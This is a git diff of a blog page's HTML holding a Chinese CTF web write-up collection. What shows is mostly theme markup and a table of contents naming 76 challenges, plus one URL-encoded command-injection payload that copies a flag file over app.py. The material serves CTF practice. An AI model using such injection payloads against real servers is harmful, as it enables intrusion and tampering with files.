-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&name=NSS-web刷题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&t=NSS-web刷题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
 
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">links</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
     </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2018-SimplePHP"><span class="toc-number">1.</span> <span class="toc-text">[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019华东南]Double Secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TQLCTF-2022-simple-bypass"><span class="toc-number">3.</span> <span class="toc-text">[TQLCTF 2022]simple_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF 2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-hardsql"><span class="toc-number">6.</span> <span class="toc-text">[NISACTF 2022]hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">7.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">8.</span> <span class="toc-text">[鹏城杯 2022]简单的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-middlerce"><span class="toc-number">9.</span> <span class="toc-text">[NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date"><span class="toc-number">10.</span> <span class="toc-text">[CISCN 2023 华北]ez_date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyupload"><span class="toc-number">11.</span> <span class="toc-text">[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSAWQual-2019-Unagi"><span class="toc-number">12.</span> <span class="toc-text">[CSAWQual 2019]Unagi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-number">13.</span> <span class="toc-text">[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">14.</span> <span class="toc-text">[CISCN 2019华东南]Web11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E6%98%AF%E5%85%84%E5%BC%9F%EF%BC%8C%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE%F0%9F%90%8E%EF%BC%81"><span class="toc-number">15.</span> <span class="toc-text">[FSCTF 2023]是兄弟，就来传你の🐎！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-flask-jwt"><span class="toc-number">16.</span> <span class="toc-text">[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-CheckIN"><span class="toc-number">17.</span> <span class="toc-text">[GKCTF 2020]CheckIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-number">18.</span> <span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-basic-check"><span class="toc-number">19.</span> <span class="toc-text">[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GDOUCTF-2023-hate-eat-snake"><span class="toc-number">20.</span> <span class="toc-text">[GDOUCTF 2023]hate eat snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Flask-PLUS"><span class="toc-number">21.</span> <span class="toc-text">[NCTF 2018]Flask PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-level-up"><span class="toc-number">22.</span> <span class="toc-text">[NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-number">23.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]Calculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-CanCanNeed"><span class="toc-number">24.</span> <span class="toc-text">[FSCTF 2023]CanCanNeed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable"><span class="toc-number">25.</span> <span class="toc-text">[湖湘杯 2021 final]Penetratable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-number">26.</span> <span class="toc-text">[CISCN 2022 初赛]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2022-Spring-Recruit-babysql"><span class="toc-number">27.</span> <span class="toc-text">[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-YamiYami"><span class="toc-number">28.</span> <span class="toc-text">[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">29.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]babyunser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-ssssti"><span class="toc-number">30.</span> <span class="toc-text">[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-Baby-Web"><span class="toc-number">31.</span> <span class="toc-text">[GFCTF 2021]Baby_Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyphp"><span class="toc-number">32.</span> <span class="toc-text">[羊城杯 2020]easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCTF-2021-loginme"><span class="toc-number">33.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">34.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">35.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E5%9B%A2%E9%98%9F%E7%BB%84-love-Pokemon"><span class="toc-number">36.</span> <span class="toc-text">[广东强网杯 2021 团队组]love_Pokemon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-Node-Magical-Login"><span class="toc-number">37.</span> <span class="toc-text">[西湖论剑 2022]Node Magical Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-real-ez-node"><span class="toc-number">38.</span> <span class="toc-text">[西湖论剑 2022]real_ez_node</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezpop"><span class="toc-number">39.</span> <span class="toc-text">[UUCTF 2022 新生赛]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LitCTF-2023-Http-pro-max-plus"><span class="toc-number">40.</span> <span class="toc-text">[LitCTF 2023]Http pro max plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">41.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp"><span class="toc-number">42.</span> <span class="toc-text">[极客大挑战 2020]greatphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-sql-by-sql"><span class="toc-number">43.</span> <span class="toc-text">[NSSRound#1 Basic]sql_by_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-ez-calc"><span class="toc-number">44.</span> <span class="toc-text">[GFCTF 2021]ez_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web1"><span class="toc-number">45.</span> <span class="toc-text">[CISCN 2019华北Day1]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF"><span class="toc-number">46.</span> <span class="toc-text">[MoeCTF 2021]地狱通讯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web2"><span class="toc-number">47.</span> <span class="toc-text">[CISCN 2019华北Day1]Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Power"><span class="toc-number">48.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Power!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">49.</span> <span class="toc-text">[ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">50.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">51.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-Cookie-is-so-subtle"><span class="toc-number">52.</span> <span class="toc-text">[BJDCTF 2020]Cookie is so subtle!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-8-Basic-Upload-gogoggo"><span class="toc-number">53.</span> <span class="toc-text">[NSSRound#8 Basic]Upload_gogoggo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-fake-game"><span class="toc-number">54.</span> <span class="toc-text">[MoeCTF 2021]fake game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-ez-factors"><span class="toc-number">55.</span> <span class="toc-text">[NSSRound#13 Basic]ez_factors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-revenge"><span class="toc-number">56.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb(revenge)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4"><span class="toc-number">57.</span> <span class="toc-text">[CISCN 2019华东南]Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">58.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p2"><span class="toc-number">59.</span> <span class="toc-text">prize_p2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2nd-MyHurricane"><span class="toc-number">60.</span> <span class="toc-text">[NSSCTF 2nd]MyHurricane</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="toc-number">61.</span> <span class="toc-text">[第五空间 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HZNUCTF-2023-final-eznode"><span class="toc-number">62.</span> <span class="toc-text">[HZNUCTF 2023 final]eznode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">63.</span> <span class="toc-text">[鹤城杯 2021]EasyP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E7%AD%BE%E5%88%B0plus"><span class="toc-number">64.</span> <span class="toc-text">[FSCTF 2023]签到plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-online-crt"><span class="toc-number">65.</span> <span class="toc-text">[CISCN 2022 初赛]online_crt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-PNG%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-number">66.</span> <span class="toc-text">[第五空间 2021]PNG图片转换器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize"><span class="toc-number">67.</span> <span class="toc-text">[GHCTF 2024 新生赛]ezzz_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce"><span class="toc-number">68.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">69.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-17-Basic-%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="toc-number">70.</span> <span class="toc-text">[NSSRound#17 Basic]真·签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-16-Basic-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97"><span class="toc-number">71.</span> <span class="toc-text">[NSSRound#16 Basic]了解过PHP特性吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2016-web400"><span class="toc-number">72.</span> <span class="toc-text">[SWPU 2016]web400</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1ctf-2019-SSRF-Me"><span class="toc-number">73.</span> <span class="toc-text">[De1ctf 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p4"><span class="toc-number">74.</span> <span class="toc-text">prize_p4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode"><span class="toc-number">75.</span> <span class="toc-text">[GKCTF 2020]ez三剑客-easynode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-V-Team-PYRCE"><span class="toc-number">76.</span> <span class="toc-text">[NSSRound#V Team]PYRCE</span></a></li></ol>
-      </div>
-    
-  </span>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
 </div>
 
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
     
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
+
     
-    <h1 class="posttitle p-name" itemprop="name headline">
-        NSS-web刷题
-    </h1>
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">NSS-web刷题</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
+                    
 
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 15, 2025&nbsp;&nbsp;13:49:02</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
 
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">Meteor_Kai</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-02-15T05:49:02.000Z" class="dt-published" itemprop="datePublished">2025-02-15</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/%E6%9D%82/" rel="tag">杂</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <p>NSSCTF web 刷题，督促自己用的，图就不放了，好麻烦嘤嘤嘤</p>
+        <div class="post-content">
+            <p>NSSCTF web 刷题，督促自己用的，图就不放了，好麻烦嘤嘤嘤</p>
 <h2 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png" alt="image-20241129090655640" style="zoom: 80%;" />
 
 <p>一眼任意文件读取</p>
@@ -1962,173 +1853,75 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ňśś=cp%09%24%28cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag%29%09app.py</span><br></pre></td></tr></table></figure>
 
 
-  </div>
-</article>
-
-
+        </div>
 
         
-          <div id="footer-post-container">
-  <div id="footer-post">
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Meteor_Kai</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/">http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>CyberSecurity brings me great joy!</span>
+                     </p>
+                
 
-    <div id="nav-footer" style="display: none">
-      <ul>
+            </section>
         
-          <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About me</a></li>
-        
-          <li><a href="/archives/">Writing</a></li>
-        
-          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-          <li><a href="/categories/">categories</a></li>
-        
-          <li><a href="/tags/">tags</a></li>
-        
-          <li><a href="/links/">links</a></li>
-        
-      </ul>
-    </div>
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%9D%82/"># 杂</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2025/02/16/VNCTF2025-Web-wp/">VNCTF2025-Web-wp</a>
+            
+            
+            <a class="next" rel="next" href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/">ctfshow元旦渗透赛wp</a>
+            
+        </section>
 
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2018-SimplePHP"><span class="toc-number">1.</span> <span class="toc-text">[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019华东南]Double Secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TQLCTF-2022-simple-bypass"><span class="toc-number">3.</span> <span class="toc-text">[TQLCTF 2022]simple_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF 2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-hardsql"><span class="toc-number">6.</span> <span class="toc-text">[NISACTF 2022]hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">7.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">8.</span> <span class="toc-text">[鹏城杯 2022]简单的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-middlerce"><span class="toc-number">9.</span> <span class="toc-text">[NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date"><span class="toc-number">10.</span> <span class="toc-text">[CISCN 2023 华北]ez_date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyupload"><span class="toc-number">11.</span> <span class="toc-text">[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSAWQual-2019-Unagi"><span class="toc-number">12.</span> <span class="toc-text">[CSAWQual 2019]Unagi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-number">13.</span> <span class="toc-text">[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">14.</span> <span class="toc-text">[CISCN 2019华东南]Web11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E6%98%AF%E5%85%84%E5%BC%9F%EF%BC%8C%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE%F0%9F%90%8E%EF%BC%81"><span class="toc-number">15.</span> <span class="toc-text">[FSCTF 2023]是兄弟，就来传你の🐎！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-flask-jwt"><span class="toc-number">16.</span> <span class="toc-text">[NSSRound#13 